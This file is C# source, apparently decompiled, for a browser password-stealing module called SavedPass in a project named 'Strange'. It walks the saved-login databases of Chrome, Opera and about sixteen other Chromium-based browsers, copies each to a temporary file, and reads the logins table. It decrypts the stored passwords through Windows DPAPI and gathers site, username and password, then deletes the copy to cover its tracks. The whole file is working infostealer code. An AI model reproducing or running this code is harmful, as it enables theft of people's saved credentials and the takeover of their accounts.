using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Strange.Additions;
using Strange.String;

namespace Strange.Main_Features
{
	// Token: 0x0200000F RID: 15
	internal class SavedPass
	{
		// Token: 0x0600001F RID: 31 RVA: 0x000028FC File Offset: 0x00000AFC
		public static List<PassData> GetPasswords()
		{
			List<PassData> list = new List<PassData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Login Data",
				environmentVariable + "\\BlackHawk\\User Data\\Default\\Login Data",
				environmentVariable + "\\Uran\\User Data\\Default\\Login Data",
				environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Login Data",
				environmentVariable + "\\CoolNovo\\User Data\\Default\\Login Data",
				environmentVariable + "\\Epic Browser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Baidu Spark\\User Data\\Default\\Login Data",
				environmentVariable + "\\Rockmelt\\User Data\\Default\\Login Data",
				environmentVariable + "\\Sleipnir\\User Data\\Default\\Login Data",
				environmentVariable + "\\SRWare Iron\\User Data\\Default\\Login Data",
				environmentVariable + "\\Titan Browser\\User Data\\Default\\Login Data",
				environmentVariable + "\\Flock\\User Data\\Default\\Login Data"
			};
			foreach (string basePath in array)
			{
				List<PassData> list2 = SavedPass.FetchPasswords(basePath);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x06000020 RID: 32
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref SavedPass.DataBlob pCipherText, ref string pszDescription, ref SavedPass.DataBlob pEntropy, IntPtr pReserved, ref SavedPass.CryptprotectPromptstruct pPrompt, int dwFlags, ref SavedPass.DataBlob pPlainText);

		// Token: 0x06000021 RID: 33 RVA: 0x00002A7C File Offset: 0x00000C7C
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			SavedPass.DataBlob dataBlob = default(SavedPass.DataBlob);
			SavedPass.DataBlob dataBlob2 = default(SavedPass.DataBlob);
			SavedPass.DataBlob dataBlob3 = default(SavedPass.DataBlob);
			SavedPass.CryptprotectPromptstruct cryptprotectPromptstruct = new SavedPass.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(SavedPass.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				SavedPass.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00002C40 File Offset: 0x00000E40
		private static List<PassData> FetchPasswords(string basePath)
		{
			List<PassData> result;
			if (!File.Exists(basePath))
			{
				result = null;
			}
			else
			{
				string program = "";
				if (basePath.Contains("Chrome"))
				{
					program = "Google Chrome";
				}
				if (basePath.Contains("Orbitum"))
				{
					program = "Orbitum Browser";
				}
				if (basePath.Contains("Opera"))
				{
					program = "Opera Browser";
				}
				if (basePath.Contains("Amigo"))
				{
					program = "Amigo Browser";
				}
				if (basePath.Contains("Torch"))
				{
					program = "Torch Browser";
				}
				if (basePath.Contains("Comodo"))
				{
					program = "Comodo Browser";
				}
				if (basePath.Contains("BlackHawk"))
				{
					program = "BlackHawk Browser";
				}
				if (basePath.Contains("Uran"))
				{
					program = "Uran Browser";
				}
				if (basePath.Contains("AcWebBrowser"))
				{
					program = "AcWebBrowser";
				}
				if (basePath.Contains("CoolNovo"))
				{
					program = "CoolNovo Browser";
				}
				if (basePath.Contains("Epic"))
				{
					program = "Epic Browser";
				}
				if (basePath.Contains("Baidu Spark"))
				{
					program = "Baidu Spark";
				}
				if (basePath.Contains("Rockmelt"))
				{
					program = "Rockmelt";
				}
				if (basePath.Contains("Sleipnir"))
				{
					program = "Sleipnir Browser";
				}
				if (basePath.Contains("SRWare Iron"))
				{
					program = "SRWare Iron";
				}
				if (basePath.Contains("Titan"))
				{
					program = "Titan Browser";
				}
				if (basePath.Contains("Flock"))
				{
					program = "Flock Browser";
				}
				try
				{
					string text = Path.GetTempPath() + "/" + NameR.GetName() + ".fv";
					if (File.Exists(text))
					{
						File.Delete(text);
					}
					File.Copy(basePath, text, true);
					Decod decod = new Decod(text);
					List<PassData> list = new List<PassData>();
					decod.ReadTable("logins");
					for (int i = 0; i < decod.GetRowCount(); i++)
					{
						try
						{
							string text2 = string.Empty;
							try
							{
								text2 = Encoding.UTF8.GetString(SavedPass.DecryptBrowsers(Encoding.Default.GetBytes(decod.GetValue(i, 5)), null));
							}
							catch (Exception)
							{
							}
							if (text2 != "")
							{
								list.Add(new PassData
								{
									Url = decod.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
									Login = decod.GetValue(i, 3),
									Password = text2,
									Program = program
								});
							}
						}
						catch (Exception)
						{
						}
					}
					File.Delete(text);
					result = list;
				}
				catch (Exception)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x02000010 RID: 16
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000007 RID: 7
			public int cbSize;

			// Token: 0x04000008 RID: 8
			public int dwPromptFlags;

			// Token: 0x04000009 RID: 9
			public IntPtr hwndApp;

			// Token: 0x0400000A RID: 10
			public string szPrompt;
		}

		// Token: 0x02000011 RID: 17
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x0400000B RID: 11
			public int cbData;

			// Token: 0x0400000C RID: 12
			public IntPtr pbData;
		}
	}
}
